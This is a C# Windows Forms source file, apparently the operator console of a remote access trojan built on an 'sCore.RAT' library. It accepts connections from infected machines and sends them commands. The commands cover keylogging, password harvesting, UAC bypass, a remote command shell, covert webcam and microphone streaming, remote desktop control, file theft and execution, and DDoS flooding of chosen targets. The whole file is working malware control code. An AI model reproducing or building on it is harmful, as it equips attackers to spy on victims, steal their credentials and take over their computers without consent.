using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.IO;
using System.Reflection;
using sCore;
using sCore.IO;

namespace TutServer
{
    public partial class Form1 : Form
    {
        private const int xfer_copy = 1;
        private const int xfer_move = 2;

        private static Socket _serverSocket;
        private static List<Socket> _clientSockets = new List<Socket>();
        private const int _BUFFER_SIZE = 20971520;
        private const int _PORT = 100; //port number
        private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
        private int[] controlClients = { 0 };
        private static bool _isCmdStarted = false;
        public static bool IsCmdStarted { get { return _isCmdStarted; } set { _isCmdStarted = value; sCore.RAT.Cmd.IsCmdOnline = value; } }
        private string _currentPath = "drive";
        private String Current_Path { get { return _currentPath; } set { _currentPath = value; sCore.RAT.FileSystem.CurrentDirectory = value; } }
        private String xfer_path = "";
        private int xfer_mode = 0;
        public static Form1 me;
        private String edit_content = "";
        private String fup_local_path = "";
        private int fdl_size = 0;
        private bool isFileDownload = false;
        private byte[] recvFile = new byte[1];
        private int write_size = 0;
        private String fdl_location = "";
        private bool _isServerStarted = false;
        private bool IsStartedServer { get { return _isServerStarted; } set { sCore.RAT.ServerSettings.serverState = value; _isServerStarted = value; } }
        private bool reScanTarget = false;
        private int reScanStart = -1;
        private int killtarget = -1;
        private Socket killSocket;
        private bool _multiRecv = false;
        private bool MultiRecv { get { return _multiRecv; } set { _multiRecv = value; sCore.RAT.ServerSettings.multiRecv = value; } }
        private bool _rdesktop = false;
        private bool RDesktop { get { return _rdesktop; } set { _rdesktop = value; sCore.RAT.RemoteDesktop.isRemoteDesktop = value; } }
        public static double dx = 0;
        public static double dy = 0;
        public static int rkeyboard = 0;
        public static int rmouse = 0;
        public static int plx = 0;
        public static int ply = 0;
        public static int resx = 0;
        public static int resy = 0;
        public static int resdataav = 0;
        private static bool _isrdFull = false;
        public static bool IsRdFull { get { return _isrdFull; } set { _isrdFull = value; sCore.RAT.RemoteDesktop.isFullScreen = value; } }
        private RDesktop Rdxref;
        public static List<Form> routeWindow = new List<Form>();
        public static List<ToolStripItem> tsitem = new List<ToolStripItem>();
        public static List<String> tsrefname = new List<String>();
        public static List<String> getvalue = new List<String>();
        public static List<String> setvalue = new List<String>();
        public static String rdRouteUpdate = "route0.none";
        public static String wcRouteUpdate = "route0.none";
        public static bool protectLv = false;
        public static int rwriteLv = 0;
        public static bool only1 = false;
        public static TabPage selected = new TabPage();
        private List<TabPage> pages = new List<TabPage>();
        public static Button rbutton = new Button();
        public static TabPage setPagebackup = new TabPage();
        public static int setFocusBack = 1;
        public static int setFocusRouteID = -1;
        private bool _austream = false;
        private bool AuStream { get { return _austream; } set { _austream = value; sCore.RAT.AudioListener.IsAudioStream = value; } }
        private audioStream astream = new audioStream();
        private bool _wStream = false;
        private bool WStream { get { return _wStream; } set { _wStream = value; sCore.RAT.RemoteCamera.IsCameraStream = value; } }
        public String remStart = "";
        private bool uploadFinished = false;
        private List<string> rMoveCommands = new List<string>();
        Timer rmoveTimer = new Timer();
        LinuxClientManager lcm;
        List<remotePipe> rPipeList = new List<remotePipe>();
        ScriptHost sh;

        public class LinuxClientManager
        {
            private List<int> clientListAssoc = new List<int>();
            private Form1 ctx;

            public LinuxClientManager(Form1 context)
            {
                ctx = context;
            }

            public void AddAssociation(int clientID)
            {
                if (clientListAssoc.Contains(clientID)) return;
                clientListAssoc.Add(clientID);
                SendCommand("getinfo-" + clientID.ToString(), clientID);
            }

            public void RemoveAssociation(int clientID)
            {
                if (!clientListAssoc.Contains(clientID)) return;
                clientListAssoc.Remove(clientID);
            }

            public void ResetAssociation()
            {
                clientListAssoc.Clear();
            }

            public bool IsLinuxClient(Socket s)
            {
                bool result = false;
                int socketID = ctx.getSocket(s);
                result = IsLinuxClient(socketID);
                return result;
            }

            public bool IsLinuxClient(int clientID)
            {
                bool result = false;

                if (clientListAssoc.Contains(clientID))
                {
                    result = true;
                }

                return result;
            }

            public void RunCustomCommands(byte[] buffer)
            {
                string command = Encoding.ASCII.GetString(buffer);

                Console.WriteLine("Command sent: " + command);

                if (command.StartsWith("lprocset"))
                {
                    command = command.Substring(8);
                    String[] lines = command.Split('\n');
                    String headerLine = lines[0];
                    int pidIndex = headerLine.IndexOf("PID");
                    pidIndex += 2;
                    int commandIndex = headerLine.IndexOf("COMMAND");
                    headerLine = null;
                    List<string> vProcName = new List<string>();
                    List<string> vProcId = new List<string>();

                    for (int i = 1; i < lines.Length; i++)
                    {
                        string line = lines[i];
                        line = line.Replace("\r", String.Empty);
                        if (line == "" | line == String.Empty) continue;
                        string strPid = "";
                        string strProcName = "";

                        for (int t = pidIndex; t >= 0; t--)
                        {
                            if (line.Length <= t) continue;
                            char value = line[t];
                            if (char.IsNumber(value))
                            {
                                strPid = value.ToString() + strPid;
                            }
                            else
                            {
                                break;
                            }
                        }

                        for (int t = commandIndex; t < line.Length; t++)
                        {
                            strProcName += line[t];
                        }

                        vProcName.Add(strProcName);
                        vProcId.Add(strPid);
                    }

                    const string responsive = "True";
                    const string noData = "N/A";

                    for (int i = 0; i < vProcName.Count; i++)
                    {
                        ctx.setprocInfoCallback(vProcName[i], responsive, noData, noData, noData, vProcId[i]);
                    }

                    vProcName.Clear();
                    vProcId.Clear();
                }

                if (command.StartsWith("cmdout|"))
                {
                    String toAppend = command.Substring(7);
                    ctx.append(toAppend);
                }
            }

            public void SendCommand(string text, int target)
            {
                //Add exeception for cmd§ -- science this (§) character doesn't get received correctly by linuxClient

                if (text.StartsWith("cmd§"))
                {
                    text = text.Substring(4);
                    text = "cmd|" + text;
                    ctx.append("user@remoteShell: " + text.Replace("cmd|", String.Empty) + Environment.NewLine);
                }
                byte[] buffer = Encoding.ASCII.GetBytes(text);
                Socket s = ctx.GetSocketById(target);
                s.Send(buffer);
            }
        }

        public class ScriptHost
        {
            string dir = "";
            //Dictionary<string, string> scriptFiles = new Dictionary<string, string>();
            private Dictionary<string, string> _globalEnum = new Dictionary<string, string>();
            private Dictionary<string, Assembly> scriptDlls = new Dictionary<string, Assembly>();
            public List<IPluginMain> runningPlugins = new List<IPluginMain>();
            public Dictionary<string, IPluginMain> ifaceList = new Dictionary<string, IPluginMain>();
            Form1 ctx;

            public ScriptHost(string rootDir, Form1 parent)
            {
                dir = rootDir;
                ctx = parent;
            }

            private void LoadDll(string dllName)
            {
                //if (!scriptDlls.ContainsKey(dllName)) return;
                Assembly curAssembly = Assembly.LoadFrom(dir + "\\" + dllName);
                IPluginMain current = null;
                foreach (Type t in curAssembly.GetTypes())
                {
                    if (t.GetInterface("IPluginMain") != null)
                    {
                        IPluginMain inst = Activator.CreateInstance(t) as IPluginMain;
                        current = inst;
                    }
                }

                if (current != null)
                {
                    ifaceList.Add(dllName, current);
                }
            }

            public void ExecuteDll(string dllName)
            {
                if (!ifaceList.ContainsKey(dllName)) return;
                IPluginMain iface = ifaceList[dllName];
                iface.Main();
            }

            private void InvokeDllThread(object obj)
            {
                IPluginMain ipm = (IPluginMain)obj;
                ipm.Main();
            }

            public void LoadDllFiles()
            {
                scriptDlls.Clear();
                ifaceList.Clear();
                foreach (string file in Directory.GetFiles(dir))
                {
                    if (!file.EndsWith(".dll")) continue; // Not a DLL File
                    Assembly currentAssembly = Assembly.LoadFrom(new FileInfo(file).FullName);
                    scriptDlls.Add(new FileInfo(file).Name, currentAssembly);
                    ctx.listBox1.Items.Add(new FileInfo(file).Name);
                }

                foreach (string key in scriptDlls.Keys)
                {
                    LoadDll(key);
                }
            }

            public object[] GetPluginInfo(string pluginName)
            {
                if (!ifaceList.ContainsKey(pluginName)) return null;
                IPluginMain iface = ifaceList[pluginName];
                return new object[] { iface.ScriptName, iface.Scriptversion, iface.ScriptDescription, iface.ScriptPermissions, iface.AuthorName };
            }

            public bool IsPluginRunning(string pluginName)
            {
                if (runningPlugins.Contains(ifaceList[pluginName])) return true;
                return false;
            }

            public void SetupBridge()
            {
                BridgeFunctions.ShowMessageBox = new MessageBoxDelegate(ctx.XMessageBox);
                BridgeFunctions.StartServer = new VoidDelegate(ctx.XStartServer);
                BridgeFunctions.StopServer = new VoidDelegate(ctx.XStopServer);
                BridgeFunctions.ToggleServer = new VoidDelegate(ctx.XToggleServer);
                BridgeFunctions.ShowRemoteMessageBox = new RemoteMessageDelegate(ctx.XRemoteMessage);
                BridgeFunctions.PlayFrequency = new StringDelegate(ctx.XFrequency);
                BridgeFunctions.PlaySystemSound = new SystemSoundDelegate(ctx.XSystemSound);
                BridgeFunctions.T2s = new StringDelegate(ctx.XT2s);
                BridgeFunctions.SwitchElementVisibility = new SystemElementDelegate(ctx.XElements);
                BridgeFunctions.CdTrayManipulation = new CdTrayDelegate(ctx.XCdTray);
                BridgeFunctions.ListProcesses = new VoidDelegate(ctx.XListProcesses);
                BridgeFunctions.KillProcess = new StringDelegate(ctx.XKillProcess);
                BridgeFunctions.StartProcess = new StartProcessDelegate(ctx.XStartProcess);
                BridgeFunctions.StartCmd = new VoidDelegate(ctx.XStartCmd);
                BridgeFunctions.StopCmd = new VoidDelegate(ctx.XStopCmd);
                BridgeFunctions.ToggleCmd = new VoidDelegate(ctx.XToggleCmd);
                BridgeFunctions.SendCmdCommand = new StringDelegate(ctx.XSendCmdCommand);
                BridgeFunctions.ReadCmdOutput = new StringReturnDelegate(ctx.XReadCmdOutput);
                BridgeFunctions.ListDrives = new VoidDelegate(ctx.XListDrives);
                BridgeFunctions.ChangeDircectory = new StringDelegate(ctx.XChangeFolder);
                BridgeFunctions.Up1Dir = new VoidDelegate(ctx.XUp1);
                BridgeFunctions.CopyFile = new StringDelegate(ctx.XCopyFile);
                BridgeFunctions.MoveFile = new StringDelegate(ctx.XMoveFile);
                BridgeFunctions.PasteFile = new StringDelegate(ctx.XPasteFile);
                BridgeFunctions.ExecuteFile = new StringDelegate(ctx.XExecuteFile);
                BridgeFunctions.UploadFile = new String2Delegate(ctx.XUploadFile);
                BridgeFunctions.DownloadFile = new String2Delegate(ctx.XDownloadFile);
                BridgeFunctions.OpenFileEditor = new StringDelegate(ctx.XOpenFileEditor);
                BridgeFunctions.ChangeFileAttribute = new ChangeAttrDelegate(ctx.XChangeAttribute);
                BridgeFunctions.DeleteFile = new StringDelegate(ctx.XDeleteFile);
                BridgeFunctions.RenameFile = new String2Delegate(ctx.XRenameFile);
                BridgeFunctions.CreateFile = new String2Delegate(ctx.XNewFile);
                BridgeFunctions.CreateFolder = new String2Delegate(ctx.XNewDirectory);
                BridgeFunctions.StartKeylogger = new VoidDelegate(ctx.XStartKeylogger);
                BridgeFunctions.StopKeylogger = new VoidDelegate(ctx.XStopKeylogger);
                BridgeFunctions.ReadKeylog = new VoidDelegate(ctx.XReadKeylog);
                BridgeFunctions.ClearKeylog = new VoidDelegate(ctx.XClearKeylog);
                BridgeFunctions.StartRemoteDesktop = new VoidDelegate(ctx.XStartRemoteDesktop);
                BridgeFunctions.StopRemoteDesktop = new VoidDelegate(ctx.XStopRemoteDesktop);
                BridgeFunctions.StartFullScreen = new VoidDelegate(ctx.XLaunchFullScreen);
                BridgeFunctions.ControlRemoteKeyboard = new BoolDelegate(ctx.XControlRemoteKeyboard);
                BridgeFunctions.ControlRemoteMouse = new BoolDelegate(ctx.XControlRemoteMouse);
                BridgeFunctions.StartAudio = new IntDelegate(ctx.XStartAudio);
                BridgeFunctions.StopAudio = new VoidDelegate(ctx.XStopAudio);
                BridgeFunctions.ListAudio = new VoidDelegate(ctx.XListAudio);
                BridgeFunctions.StartVideo = new IntDelegate(ctx.XStartVideo);
                BridgeFunctions.StopVideo = new VoidDelegate(ctx.XStopVideo);
                BridgeFunctions.ListVideo = new VoidDelegate(ctx.XListVideo);
                BridgeFunctions.StartDDoS = new DDoSDelegate(ctx.XStartDDoS);
                BridgeFunctions.StopDDoS = new VoidDelegate(ctx.XStopDDoS);
                BridgeFunctions.ValidateDDoS = new DDoSTestDelegate(ctx.XValidateDDoS);
                BridgeFunctions.ListPassword = new VoidDelegate(ctx.XListPassword);
                BridgeFunctions.ClearList = new VoidDelegate(ctx.XClearList);
                BridgeFunctions.BypassUAC = new VoidDelegate(ctx.XBypassUAC);
                BridgeFunctions.StartProxy = new VoidDelegate(ctx.XLaunchProxy);
                BridgeFunctions.SaveFile = new StringDelegate(ctx.XSaveEditorFile);
                BridgeFunctions.ShowInputBox = new InputDelegate(ctx.XInputBox);
                sCore.UI.CommonControls.fileManagerMenu = ctx.contextMenuStrip3;
                sCore.UI.CommonControls.processMenu = ctx.contextMenuStrip2;
                sCore.UI.CommonControls.mainTabControl = ctx.tabControl1;
                sCore.UI.ControlManager.FormControls = ctx.Controls;
            }
        }

        #region Cross Bridge Functions

        public Types.InputBoxValue XInputBox(string title, string message)
        {
            if (InvokeRequired)
            {
                return (Types.InputBoxValue) Invoke(BridgeFunctions.ShowInputBox, new object[] { title, message });
            }

            string value = "";
            DialogResult result = InputBox(title, message, ref value);
            Types.InputBoxValue inputValue = new Types.InputBoxValue()
            {
                dialogResult = result,
                result = value
            };

            return inputValue;
        }

        public void XSaveEditorFile(string content)
        {
            saveFile(content);
        }

        public void XLaunchProxy()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StartProxy);
                return;
            }

            button34_Click(null, null);
        }

        public void XBypassUAC()
        {
            loopSend("uacbypass");
        }

        public void XListPassword()
        {
            loopSend("getpw");
        }

        public void XClearList()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.ClearList);
                return;
            }

            button32_Click(null, null);
        }

        public void XStartDDoS(Types.DDoSTarget ddos, bool attackWithAll)
        {
            StartDDoS(ddos.IPAddress, ddos.PortNumber.ToString(), sCore.Utils.Convert.ToStr(ddos.DDoSProtocol), ddos.PacketSize.ToString(), ddos.ThreadCount.ToString(), ddos.Delay.ToString(), attackWithAll);
        }

        public void XStopDDoS()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StopDDoS);
                return;
            }

            button30_Click(null, null);
        }

        public void XValidateDDoS(Types.DDoSTarget ddos)
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.ValidateDDoS);
                return;
            }

            bool result = TestDDoS(ddos.IPAddress, sCore.Utils.Convert.ToStr(ddos.DDoSProtocol));
        }

        public void XStartVideo(int deviceNumber)
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StartVideo);
                return;
            }

            if (!WStream)
            {
                String id = deviceNumber.ToString();
                String command = "wstream§" + id;
                MultiRecv = true;
                WStream = true;
                button27.Text = "Stop stream";
                loopSend(command);
                return;
            }
        }

        public void XStopVideo()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StopVideo);
                return;
            }

            if (WStream)
            {
                if (!RDesktop && !AuStream)
                {
                    Application.DoEvents();
                    System.Threading.Thread.Sleep(1500);
                    MultiRecv = false;
                }
                WStream = false;
                button27.Text = "Start Stream";
                loopSend("wstop");
            }
        }

        public void XListVideo()
        {
            loopSend("wlist");
        }

        public void XStartAudio(int deviceNumber)
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StartAudio);
                return;
            }

            if (!AuStream)
            {
                MultiRecv = true;
                AuStream = true;
                astream = new audioStream();
                astream.init();
                loopSend("astream§" + deviceNumber.ToString());
                button25.Text = "Stop Stream";
                return;
            }
        }

        public void XStopAudio()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StopAudio);
                return;
            }

            if (AuStream)
            {
                loopSend("astop");
                if (!RDesktop && !WStream)
                {
                    Application.DoEvents();
                    System.Threading.Thread.Sleep(1500);
                    MultiRecv = false;
                }
                AuStream = false;
                astream.destroy();
                astream = null;
                button25.Text = "Start Stream";
            }
        }

        public void XListAudio()
        {
            loopSend("alist");
        }

        public void XStartRemoteDesktop()
        {
            if (!RDesktop)
            {
                button21_Click(null, null);
            }
        }

        public void XStopRemoteDesktop()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StopRemoteDesktop);
                return;
            }

            button22_Click(null, null);
        }

        public void XControlRemoteMouse(bool state)
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.ControlRemoteMouse);
                return;
            }

            checkBox1.Checked = state;
            checkBox1_CheckedChanged(null, null);
        }

        public void XControlRemoteKeyboard(bool state)
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.ControlRemoteKeyboard);
                return;
            }

            checkBox2.Checked = state;
            checkBox2_CheckedChanged(null, null);
        }

        public void XLaunchFullScreen()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StartFullScreen);
                return;
            }

            button23_Click(null, null);
        }

        public void XStartKeylogger()
        {
            loopSend("sklog");
        }

        public void XStopKeylogger()
        {
            loopSend("stklog");
        }

        public void XReadKeylog()
        {
            loopSend("rklog");
        }

        public void XClearKeylog()
        {
            loopSend("cklog");
        }

        public void XListDrives()
        {
            loopSend("fdrive");
        }

        public void XChangeFolder(string folderName)
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.ChangeDircectory, new object[] { folderName });
                return;
            }

            loopSend("fdir§" + folderName);
            Current_Path = folderName;
            listView3.Items.Clear();
        }

        public void XUp1()
        {
            loopSend("fdir§" + Current_Path);            
        }

        public void XCopyFile(string fileName)
        {
            xfer_path = fileName;
            xfer_mode = xfer_copy;
        }

        public void XMoveFile(string fileName)
        {
            xfer_path = fileName;
            xfer_mode = xfer_move;
        }

        public void XPasteFile(string targetDirectory)
        {
            loopSend("fpaste§" + targetDirectory + "§" + xfer_path + "§" + xfer_mode);
        }

        public void XExecuteFile(string targetFile)
        {
            loopSend("fexec§" + targetFile);
        }

        public void XUploadFile(string dir, string file)
        {
            dir += "\\" + new FileInfo(file).Name;
            String cmd = "fup§" + dir + "§" + new FileInfo(file).Length;
            fup_local_path = file;
            uploadFinished = false;
            loopSend(cmd);
        }

        public void XDownloadFile(string targetFile, string remoteFile)
        {
            fdl_location = targetFile;
            loopSend("fdl§" + remoteFile);
        }

        public void XOpenFileEditor(string remoteFile)
        {
            edit_content = remoteFile;
            loopSend("getfile§" + remoteFile);
        }

        public void XChangeAttribute(string remoteFile, Types.Visibility visibility)
        {
            string command = "f" + sCore.Utils.Convert.ToStr(visibility) + "§" + remoteFile;
            loopSend(command);
        }

        public void XDeleteFile(string remoteFile)
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.DeleteFile, new object[] { remoteFile });
                return;
            }

            loopSend("fdel§" + remoteFile);
            refresh();
        }

        public void XRenameFile(string remoteFile, string newName)
        {
            loopSend("frename§" + remoteFile + "§" + newName);
        }

        public void XNewDirectory(string targetDirectory, string name)
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.CreateFolder, new object[] { targetDirectory, name });
                return;
            }

            loopSend("fndir§" + targetDirectory + "§" + name);
            refresh();
        }

        public void XNewFile(string targetDirectory, string name)
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.CreateFile, new object[] { targetDirectory, name });
                return;
            }

            loopSend("ffile§" + targetDirectory + "§" + name);
            refresh();
        }

        public DialogResult XMessageBox(string text, string title, MessageBoxButtons buttons, MessageBoxIcon icon)
        {
            if (InvokeRequired)
            {
                return (DialogResult) Invoke(BridgeFunctions.ShowMessageBox, new object[] { text, title, buttons, icon });
            }

            return MessageBox.Show(this, text, title, buttons, icon);
        }

        public void XStartServer()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StartServer);
                return;
            }
            if (!IsStartedServer) button1_Click(null, null);
        }

        public void XStopServer()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StopServer);
                return;
            }
            if (IsStartedServer) button1_Click(null, null);
        }

        public void XToggleServer()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.ToggleServer);
                return;
            }

            button1_Click(null, null);
        }

        public void XRemoteMessage(string text, string title, Types.RemoteMessageButtons buttons, Types.RemoteMessageIcons icon)
        {
            string command = "msg|" + title + "|" + text + "|" + ((int)icon).ToString() + "|" + ((int)buttons).ToString();
            loopSend(command);
        }

        public void XFrequency(string frequency)
        {
            loopSend("freq-" + frequency);
        }

        public void XSystemSound(Types.SystemSounds sound)
        {
            string command = "sound-" + ((int)sound).ToString();
            loopSend(command);
        }

        public void XT2s(string text)
        {
            string command = "t2s|" + text;
            loopSend(command);
        }

        public void XElements(Types.SystemElements element, Types.Visibility visibility)
        {
            string welement = sCore.Utils.Convert.ToStr(element);
            string wvisibility = sCore.Utils.Convert.ToStr(visibility);
            string command = "emt|" + wvisibility + "|" + welement;
            loopSend(command);
        }

        public void XCdTray(Types.CdTray cdState)
        {
            string command = "cd|" + sCore.Utils.Convert.ToStr(cdState);
            loopSend(command);
        }

        public void XListProcesses()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.ListProcesses);
                return;
            }

            refreshToolStripMenuItem1_Click(null, null);
        }

        public void XKillProcess(string processId)
        {
            String cmd = "prockill|" + processId;

            loopSend(cmd);

            System.Threading.Thread.Sleep(1000);
            XListProcesses();
        }

        public void XStartProcess(string processName, Types.Visibility visibility)
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.StartProcess, new object[] { processName, visibility });
                return;
            }

            String cmd = "procstart|" + processName + "|" + sCore.Utils.Convert.ToStrProcessVisibility(visibility);

            loopSend(cmd);
            textBox4.Clear();
            System.Threading.Thread.Sleep(1000);
            XListProcesses();
        }

        public void XStartCmd()
        {
            if (!IsCmdStarted)
            {
                if (InvokeRequired)
                {
                    Invoke(BridgeFunctions.StartCmd);
                    return;
                }
                button15_Click(null, null);
            }
        }

        public void XStopCmd()
        {
            if (IsCmdStarted)
            {
                if (InvokeRequired)
                {
                    Invoke(BridgeFunctions.StopCmd);
                    return;
                }

                button15_Click(null, null);
            }
        }

        public void XToggleCmd()
        {
            if (InvokeRequired)
            {
                Invoke(BridgeFunctions.ToggleCmd);
                return;
            }
            button15_Click(null, null);
        }

        public void XSendCmdCommand(string command)
        {
            loopSend("cmd§" + command);
        }

        public string XReadCmdOutput()
        {
            if (InvokeRequired)
            {
                return (string)Invoke(BridgeFunctions.ReadCmdOutput);
            }

            return richTextBox2.Text;
        }

        #endregion

        public Form1()
        {
            me = this;
            InitializeComponent();
        }

        public Socket GetSocketById(int id)
        {
            if (id > _clientSockets.Count) return null;
            return _clientSockets[id];
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            ServicePointManager.UseNagleAlgorithm = false;
            richTextBox2.ReadOnly = true;
            richTextBox2.BackColor = Color.Black;
            richTextBox2.ForeColor = Color.White;
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
            comboBox3.SelectedIndex = 0;
            comboBox4.SelectedIndex = 0;
            label24.Hide();
            for (int a = 0; a < contextMenuStrip2.Items.Count; a++)
            {
                ToolStripItem i = contextMenuStrip2.Items[a];
                tsitem.Add(i);
                tsrefname.Add(i.Name);
            }
            for (int a = 0; a < contextMenuStrip3.Items.Count; a++)
            {
                ToolStripItem i = contextMenuStrip3.Items[a];
                tsitem.Add(i);
                tsrefname.Add(i.Name);
            }
            foreach (TabPage p in tabControl1.TabPages)
            {
                pages.Add(p);
            }

            Timer update = new Timer();
            update.Interval = 100; // prev. 3000
            update.Tick += new EventHandler(updateValues);
            update.Start();

            Class1.test = "not test";
            sh = new ScriptHost("scripts", this);
            sh.LoadDllFiles();
            sh.SetupBridge();
        }

        private void updateValues(object sender, EventArgs e)
        {
            if (setvalue.Count != 0)
            {
                Console.WriteLine("update setValue");
                List<String> tempInst = setvalue;

                try
                {
                    foreach (String task in setvalue)
                    {
                        foreach (TabPage t in tabControl1.TabPages)
                        {
                            bool breakTab = false;
                            Control.ControlCollection all = t.Controls;
                            foreach (Control c in all)
                            {
                                String name = task.Split('§')[0];

                                if (name == c.Name)
                                {
                                    if (name.StartsWith("textBox") || name.StartsWith("richTextBox"))
                                    {
                                        c.Text = task.Split('§')[1];
                                        tempInst.Remove(task);
                                    }
                                    if (name.StartsWith("checkBox"))
                                    {
                                        String param = task.Split('§')[1];
                                        bool set = false;
                                        if (param.ToLower() == "true") set = true;
                                        CheckBox cb = c as CheckBox;
                                        cb.Checked = set;
                                        tempInst.Remove(task);
                                    }
                                    if (name.StartsWith("comboBox"))
                                    {
                                        String param = task.Split('§')[1];
                                        ComboBox cb = c as ComboBox;
                                        cb.SelectedItem = param;
                                        tempInst.Remove(task);
                                    }
                                    if (name.StartsWith("listView"))
                                    {
                                        String param = task.Split('§')[1];
                                        int set = int.Parse(param);
                                        ListView lv = c as ListView;
                                        lv.Items[lv.SelectedIndices[0]].Selected = false;
                                        lv.Items[set].Selected = true;
                                        Console.WriteLine("setvalue INDEX: " + set.ToString());
                                        //lv.Focus();
                                        tempInst.Remove(task);
                                    }
                                    breakTab = true;
                                }
                            }

                            if (breakTab)
                            {
                                break; 
                            }

                        }

                        if (task.Split('§')[0].StartsWith("tabControl1"))
                        {
                            Console.WriteLine("setValue tabControl1.SelectedPage");
                            String param = task.Split('§')[1];
                            tabControl1.SelectedTab = pages[int.Parse(param) - 1];
                            tempInst.Remove(task);
                            //Console.WriteLine(tempInst.Count.ToString());
                        }
                    }
                
                setvalue = tempInst;

                }
                catch (Exception ex)
                {
                    //Do nothing
                    Console.WriteLine("Routed Window value update error");
                }
            }
            List<String> tmp = new List<String>();

            foreach(TabPage t in tabControl1.TabPages)
            {
                Control.ControlCollection all = t.Controls;
                foreach (Control c in all)
                {
                    //()(c.Name);
                    if (c.Name.StartsWith("button"))
                    {
                        tmp.Add(c.Name + "§" + c.Text);
                    }
                    if (c.Name.StartsWith("label"))
                    {
                        tmp.Add(c.Name + "§" + c.Text);
                    }
                    if (c.Name.StartsWith("checkBox"))
                    {
                        CheckBox cc = (CheckBox)c;
                        tmp.Add(c.Name + "§" + cc.Checked.ToString().ToLower());
                    }
                    if (c.Name.StartsWith("comboBox"))
                    {
                        ComboBox cb = (ComboBox)c;
                        string si = "";
                        if (cb.SelectedItem != null) si = cb.SelectedItem.ToString();
                        tmp.Add(c.Name + "§" + si);
                    }
                    if (c.Name.StartsWith("textBox"))
                    {
                        tmp.Add(c.Name + "§" + c.Text);
                    }
                    if (c.Name.StartsWith("richTextBox"))
                    {
                        tmp.Add(c.Name + "§" + c.Text);
                    }
                    if (c.Name.StartsWith("listView"))
                    {
                        ListView lv = (ListView)c;
                        String select = "";
                        String items = lv.Name + "§";
                        if (lv.SelectedIndices.Count > 0)
                        {
                            select = lv.SelectedIndices[0].ToString();
                            //Console.WriteLine("LV Select Index Stored: " + select);
                        }
                        else
                        {
                            select = "-1";
                        }


                        foreach (ListViewItem lvi in lv.Items)
                        {
                            String emt = "";
                            int sindex = lvi.SubItems.Count;
                            int count = 0;
                            foreach (ListViewItem.ListViewSubItem si in lvi.SubItems)
                            {
                                if (count < sindex)
                                {
                                    emt += si.Text + "|";
                                }
                                else
                                {
                                    emt += si.Text;
                                }

                                count++;
                            }

                            items += emt + "§";
                        }
                        items += select;
                        tmp.Add(items);

                    }
                }
            }
            getvalue = tmp;
            selected = tabControl1.SelectedTab;
            //protectLv = false;
            //this.Text = getvalue.Count.ToString();
            
        }


        private void SetupServer()
        {
            label1.Text = "Setting up server";
            _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _serverSocket.Bind(new IPEndPoint(IPAddress.Any, _PORT));
            _serverSocket.Listen(5);
            _serverSocket.BeginAccept(AcceptCallback, null);
            lcm = new LinuxClientManager(this);
            label1.Text = "Server is up and running\n";
        }


	private void listClients()
	{
		int i = 0;
        listView1.Items.Clear();

        foreach (Socket socket in _clientSockets)
        {
            ListViewItem lvi = new ListViewItem();
            lvi.Text = i.ToString();

            listView1.Items.Add(lvi);
            i++;
        }
	}

    private void CloseAllSockets()
    {
        IsStartedServer = false;
        int id = 0;

        foreach (Socket socket in _clientSockets)
        {
            try
            {
                sendCommand("dc", id);
                socket.Shutdown(SocketShutdown.Both);
                socket.Close();
                socket.Dispose();
            }
            catch (Exception)
            {
                Console.WriteLine("Client" + id + " failed to send dc request!");
            }
            id++;
        }

        if (lcm != null) lcm.ResetAssociation();

        _serverSocket.Close();
        _serverSocket.Dispose();

        _clientSockets.Clear();
    }



//AcceptCallback (when a server accepting client to connect)

        private void AcceptCallback(IAsyncResult AR)
        {
            Socket socket;
            
            try
            {
                socket = _serverSocket.EndAccept(AR);
            }
            catch (Exception)
            {
                Console.WriteLine("Accept callback error");
                return;
            }

           _clientSockets.Add(socket);
           int id = _clientSockets.Count - 1;
           addlvClientCallback("Client " + id);
           String cmd = "getinfo-" + id.ToString();
           sendCommand(cmd, id);
           socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket);
            _serverSocket.BeginAccept(AcceptCallback, null);
        }

        private delegate void addlvClient(String clientid);

        private void addlvClientCallback(String clientid)
        {
            if (this.InvokeRequired)
            {
                addlvClient k = new addlvClient(addlvClientCallback);
                this.Invoke(k, new object[] { clientid } );
            }
            else
            {
                listView1.Items.Add(clientid);
            }
        }

        private delegate void restartServerCallback(int id);

        private void restartServer(int id)
        {
            if (this.InvokeRequired)
            {
                restartServerCallback callback = new restartServerCallback(restartServer);
                this.Invoke(callback, new object[] { id });
            }
            else
            {
                button1.PerformClick();
                button1.PerformClick();
                label24.ForeColor = Color.Red;
                label24.Text = "Client " + id.ToString() + " Disconnected\nOther Sessions restored!";
                label24.Show();
                Timer t = new Timer();
                t.Interval = 5000;
                t.Tick += new EventHandler(dismissUpdate);
                t.Start();
            }
        }

        private void dismissUpdate(object sender, EventArgs e)
        {
            Timer me = (Timer)sender;
            label24.Text = "";
            label24.ForeColor = Color.Black;
            label24.Hide();
            me.Stop();
        }

